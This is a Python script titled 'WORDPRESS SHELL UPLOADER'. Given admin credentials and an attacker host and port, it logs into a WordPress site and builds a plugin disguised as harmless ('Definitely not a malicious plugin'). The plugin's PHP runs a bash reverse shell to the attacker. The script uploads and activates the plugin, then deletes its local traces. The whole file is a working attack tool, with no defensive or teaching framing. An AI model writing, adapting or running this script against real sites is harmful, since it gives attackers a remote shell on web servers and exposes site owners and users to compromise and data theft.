import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning 

from bs4 import BeautifulSoup

import string

import sys

import zipfile

import os

import argparse



import random



def cls():
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])
def print_logo():
        print ("""------------------------------------------------""")
        print ("""	  WORDPRESS SHELL UPLOADER """)
        print ("""------------------------------------------------""")

cls()
print_logo()
# Disable ssl warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  



url = input("Enter Wordpress target url: ")
username = input("Enter Wordpress Username: ")   
password = input("Enter Wordpress Password: ")
host = input("Enter Attacker Host: ")
port = input("Enter Attacker Port: ")
k = input("Disable SSL/TLS Check? (y/n): ")
if k == 'y':
    k = False
else:
    k = True
    

class WordpressMaliciousPluginUploader:

    def __init__(self, wordpress_link, username, password, ip, port, ssl_verify):

        if wordpress_link[-1] == '/':

            wordpress_link = wordpress_link[:-1]

        self.wordpress_link = wordpress_link   

        self.username = username  

        self.password = password   

        self.ip = ip

        self.port = port 
        
        self.ssl_verify = ssl_verify  

        self.wp_login = f'{self.wordpress_link}/wp-login.php'

        self.wp_admin = f'{self.wordpress_link}/wp-admin/'

        self.plugin_upload_link = f'{self.wordpress_link}/wp-admin/update.php?action=upload-plugin'

        self.plugin_install_link = f'{self.wordpress_link}/wp-admin/plugin-install.php'

        self.session = requests.session()

        self.session.headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.61'}



    def make_malicious_plugin(self):

        tmp_php_filename = 'code.php'

        plugin_zip_filename = 'wp_malicious_plugin.zip'

        print('Making the malicious plugin...')

        random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

        php_code = f'''<?php

                /**

                * Plugin Name: Cute plugin {random_string}

                * Plugin URI: https://127.0.0.1:31337/pwn.php?cmd=whomai

                * Description: Definitely not a malicious plugin.

                */

                shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1'")

                ?>'''

        with open(tmp_php_filename, 'w') as f:

            f.write(php_code)

        with zipfile.ZipFile(plugin_zip_filename, mode='w') as z:

            z.write(tmp_php_filename)

        return plugin_zip_filename



    def login(self):

        print('Logging In... (If you stuck here forever you already have a shell)')

        data = {

            'log': self.username, 'pwd': self.password, 'wp-submit': 'Log In',

            'redirect_to': self.wp_admin, 'testcookie': '1'

        }

        try:

            req = self.session.get(self.wp_login, verify=self.ssl_verify)

        except requests.exceptions.SSLError:

            print('SSL Error you may use "-k" to disable the SSL/TLS checks')

            sys.exit(1)

        login_req = self.session.post(self.wp_login, data=data, verify=self.ssl_verify)

        if "<title>Dashboard" in login_req.text:

            print('Logged In Successfully')

            return True

        else:

            print('Login failed username or password is incorrect')

            return



    def upload_and_active(self, plugin_zip_file):

        # Uploading the plugin

        print('Uploading The malicious plugin...')

        upload_page = self.session.get(self.plugin_install_link, verify=self.ssl_verify)

        soup = BeautifulSoup(upload_page.content, features="html.parser")

        _wpnonce = soup.find('input', {'id': '_wpnonce'})['value']



        data = {

            '_wpnonce': (None, _wpnonce),

            '_wp_http_referer': (None, "/wordpress/wp-admin/plugin-install.php?tab=upload"),

            'install-plugin-submit': (None, 'Install Now'),

            'pluginzip': ('pluginzip', open(plugin_zip_file, 'rb'), "application/octet-stream")

        }

        upload_req = self.session.post(self.plugin_upload_link, files=data, verify=self.ssl_verify)



        # Activating the plugin

        print('Activating it...')

        soup2 = BeautifulSoup(upload_req.content, features="html.parser")

        active_link = self.wp_admin + soup2.find('a', string='Activate Plugin')['href']

        print('Done you should have a shell now')

        activate_req = self.session.get(active_link, verify=False)



    def main(self):

        # Login

        login_status = self.login()

        if not login_status:

            sys.exit()



        # Making the reverse shell plugin file

        plugin_zip_file = self.make_malicious_plugin()



        # Uploading the plugin and activating it

        self.upload_and_active(plugin_zip_file)



        # Cleaning up

        self.session.close()

        os.remove('wp_malicious_plugin.zip')

        os.remove('code.php')





program = WordpressMaliciousPluginUploader(url, username, password, host, port, k)  

program.main()